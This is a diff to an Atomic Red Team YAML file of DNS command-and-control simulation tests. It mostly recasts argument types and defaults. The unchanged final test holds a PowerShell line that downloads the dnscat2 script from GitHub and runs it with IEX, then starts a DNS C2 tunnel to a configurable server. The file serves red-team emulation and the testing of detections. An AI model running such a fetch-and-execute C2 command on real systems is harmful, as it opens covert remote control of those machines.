@@ -12,19 +12,19 @@ atomic_tests:
   input_arguments:
     query_type:
       description: DNS query type
-      type: string
+      type: String
       default: TXT
     subdomain:
       description: Subdomain prepended to the domain name
-      type: string
+      type: String
       default: atomicredteam
     query_volume:
       description: Number of DNS queries to send
-      type: integer
-      default: "1000"
+      type: Integer
+      default: 1000
     domain:
       description: Default domain to simulate against
-      type: string
+      type: String
       default: 127.0.0.1.xip.io
   executor:
     command: |
@@ -41,28 +41,28 @@ atomic_tests:
   input_arguments:
     runtime:
       description: Time in minutes to run the simulation
-      type: integer
-      default: "30"
+      type: Integer
+      default: 30
     domain:
       description: Default domain to simulate against
-      type: string
+      type: String
       default: 127.0.0.1.xip.io
     subdomain:
       description: Subdomain prepended to the domain name
-      type: string
+      type: String
       default: atomicredteam
     query_type:
       description: DNS query type
-      type: string
+      type: String
       default: TXT
     c2_interval:
       description: Seconds between C2 requests to the command and control server
-      type: integer
-      default: "30"
+      type: Integer
+      default: 30
     c2_jitter:
       description: Percentage of jitter to add to the C2 interval to create variance in the times between C2 requests
-      type: integer
-      default: "20"
+      type: Integer
+      default: 20
   executor:
     command: |
       Set-Location PathToAtomicsFolder
@@ -79,15 +79,15 @@ atomic_tests:
   input_arguments:
     query_type:
       description: DNS query type
-      type: string
+      type: String
       default: TXT
     subdomain:
       description: Subdomain prepended to the domain name (should be 63 characters to test maximum length)
-      type: string
+      type: String
       default: atomicredteamatomicredteamatomicredteamatomicredteamatomicredte
     domain:
       description: Default domain to simulate against
-      type: string
+      type: String
       default: 127.0.0.1.xip.io
   executor:
     command: |
@@ -108,15 +108,14 @@ atomic_tests:
   input_arguments:
     domain:
       description: Domain Name configured to use DNS Server where your C2 listener is running
-      type: string
+      type: String
       default: example.com
     server_ip:
       description: IP address of DNS server where your C2 listener is running
-      type: string
+      type: String
       default: 127.0.0.1
   executor:
     command: |
       IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/lukebaggett/dnscat2-powershell/45836819b2339f0bb64eaf294f8cc783635e00c6/dnscat2.ps1')
       Start-Dnscat2 -Domain #{domain} -DNSServer #{server_ip}
     name: powershell
-
